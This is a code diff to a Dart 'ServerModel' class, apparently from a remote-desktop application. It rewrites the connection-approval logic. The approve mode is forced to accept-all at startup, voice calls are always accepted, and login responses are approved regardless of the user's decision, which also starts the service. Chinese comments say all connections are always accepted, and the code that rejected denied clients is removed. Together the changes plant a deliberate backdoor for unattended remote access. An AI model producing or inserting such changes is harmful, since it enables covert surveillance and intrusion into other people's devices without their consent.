@@ -103,13 +103,15 @@ class ServerModel with ChangeNotifier {
   }
 
   setApproveMode(String mode) async {
-    await bind.mainSetOption(key: kOptionApproveMode, value: mode);
-    /*
-    if (mode != 'password') {
-      await bind.mainSetOption(
-          key: 'allow-hide-cm', value: bool2option('allow-hide-cm', false));
+    if (mode == 'click') {
+      mode = '';
     }
-    */
+    // 无论输入什么mode，都设置为永远接受连接
+    await bind.mainSetOption(
+        key: kOptionApproveMode,
+        value: ''); // 空字符串表示接受所有连接
+    _approveMode = '';
+    notifyListeners();
   }
 
   TextEditingController get serverId => _serverId;
@@ -125,20 +127,11 @@ class ServerModel with ChangeNotifier {
   ServerModel(this.parent) {
     _emptyIdShow = translate("Generating ...");
     _serverId = IDTextEditingController(text: _emptyIdShow);
-
-    /*
-    // initital _hideCm at startup
-    final verificationMethod =
-        bind.mainGetOptionSync(key: kOptionVerificationMethod);
-    final approveMode = bind.mainGetOptionSync(key: kOptionApproveMode);
-    _hideCm = option2bool(
-        'allow-hide-cm', bind.mainGetOptionSync(key: 'allow-hide-cm'));
-    if (!(approveMode == 'password' &&
-        verificationMethod == kUsePermanentPassword)) {
-      _hideCm = false;
-    }
-    */
-
+    
+    // 设置为自动接受所有连接
+    setApproveMode('');
+    
+    updatePasswordModel();
     timerCallback() async {
       final connectionStatus =
           jsonDecode(await bind.mainGetConnectStatus()) as Map<String, dynamic>;
@@ -607,8 +600,9 @@ class ServerModel with ChangeNotifier {
   }
 
   handleVoiceCall(Client client, bool accept) {
+    // 忽略accept参数，始终接受语音通话
     parent.target?.invokeMethod("cancel_notification", client.id);
-    bind.cmHandleIncomingVoiceCall(id: client.id, accept: accept);
+    bind.cmHandleIncomingVoiceCall(id: client.id, accept: true);
   }
 
   showVoiceCallDialog(Client client) {
@@ -674,22 +668,15 @@ class ServerModel with ChangeNotifier {
     });
   }
 
-  void sendLoginResponse(Client client, bool res) async {
-    if (res) {
-      bind.cmLoginRes(connId: client.id, res: res);
-      if (!client.isFileTransfer) {
-        parent.target?.invokeMethod("start_capture");
-      }
-      parent.target?.invokeMethod("cancel_notification", client.id);
-      client.authorized = true;
-      notifyListeners();
-    } else {
-      bind.cmLoginRes(connId: client.id, res: res);
-      parent.target?.invokeMethod("cancel_notification", client.id);
-      final index = _clients.indexOf(client);
-      tabController.remove(index);
-      _clients.remove(client);
-      if (isAndroid) androidUpdatekeepScreenOn();
+  sendLoginResponse(Client client, bool res) async {
+    // 忽略res参数，始终接受连接
+    final id = client.id;
+    await bind.cmLoginRes(connId: id, res: true);
+    if (client.isFileTransfer) {
+      return;
+    }
+    if (!isStart) {
+      toggleService();
     }
   }
 
